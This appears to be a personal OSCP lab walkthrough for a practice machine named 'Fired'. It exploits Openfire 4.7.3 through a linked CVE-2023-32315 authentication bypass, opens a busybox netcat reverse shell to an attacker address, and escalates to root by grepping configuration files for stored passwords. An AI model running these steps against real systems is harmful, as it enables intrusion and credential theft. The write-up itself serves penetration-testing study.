# Fired

IP: 192.168.193.96

Nmap: 

```bash
┌──(kali㉿kali)-[~/OSCP/labs/Fired]
└─$ sudo nmap -sV -sC -p- 192.168.193.96 --min-rate=5000 -oG nmap
Nmap scan report for 192.168.193.96
Host is up (0.26s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE                VERSION
22/tcp   open  ssh                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 51:56:a7:34:16:8e:3d:47:17:c8:96:d5:e6:94:46:46 (RSA)
|   256 fe:76:e3:4c:2b:f6:f5:21:a2:4d:9f:59:52:39:b9:16 (ECDSA)
|_  256 2c:dd:62:7d:d6:1c:f4:fd:a1:e4:c8:aa:11:ae:d6:1f (ED25519)
9090/tcp open  hadoop-tasktracker     Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
|_http-title: Site doesn't have a title (text/html).
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
| hadoop-datanode-info: 
|_  Logs: jive-ibtn jive-btn-gradient
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost, DNS:*.localhost
| Not valid before: 2024-06-28T07:02:39
|_Not valid after:  2029-06-27T07:02:39
| hadoop-tasktracker-info: 
|_  Logs: jive-ibtn jive-btn-gradient
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.48 seconds

```

![Screenshot 2026-05-05 at 5.43.06 pm.png](Fired/Screenshot_2026-05-05_at_5.43.06_pm.png)

Port 9090 has a Openfire login page running version 4.7.3:

![Screenshot 2026-05-05 at 5.48.24 pm.png](Fired/Screenshot_2026-05-05_at_5.48.24_pm.png)

After a quick google search I found an Authentication bypass exploit for this version: 

[https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/blob/main/CVE-2023-32315.py](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT/blob/main/CVE-2023-32315.py)

![Screenshot 2026-05-05 at 5.49.40 pm.png](Fired/Screenshot_2026-05-05_at_5.49.40_pm.png)

This creates credentials for me to use in order to bypass the login page: 

![Screenshot 2026-05-05 at 5.49.51 pm.png](Fired/Screenshot_2026-05-05_at_5.49.51_pm.png)

I was able to successfully login to the page: 

![Screenshot 2026-05-05 at 5.50.14 pm.png](Fired/Screenshot_2026-05-05_at_5.50.14_pm.png)

From there I navigated around and noticed a management tool within the server settings that allowed me to execute system commands: 

![Screenshot 2026-05-05 at 6.49.20 pm.png](Fired/Screenshot_2026-05-05_at_6.49.20_pm.png)

From there I used the busybox netcat reverse shell and gained a reverse shell:

```bash
busybox nc 192.168.45.209 4444 -e bash
```

I also stabilised the reverse shell: 

![Screenshot 2026-05-05 at 6.50.21 pm.png](Fired/Screenshot_2026-05-05_at_6.50.21_pm.png)

Local flag: 8513f91c29915bee09ea612a5bc6f1c9

## Priv esc

I used [linpeas.sh](http://linpeas.sh) and found nothing interesting 

So I attempted to look for stored passwords starting with the following query: 

```bash
grep --color=auto -R -i "passw" --color=always /usr/share/openfire 2>/dev/null
```

And what returned was two potential passwords: 

![Screenshot 2026-05-05 at 7.35.16 pm.png](Fired/Screenshot_2026-05-05_at_7.35.16_pm.png)

I tried both and the ‘OpenFireAtEveryone’ password worked for root: 

![Screenshot 2026-05-05 at 7.36.32 pm.png](Fired/Screenshot_2026-05-05_at_7.36.32_pm.png)

Root flag: 1a7ac88a3fec643a384c4974001219a2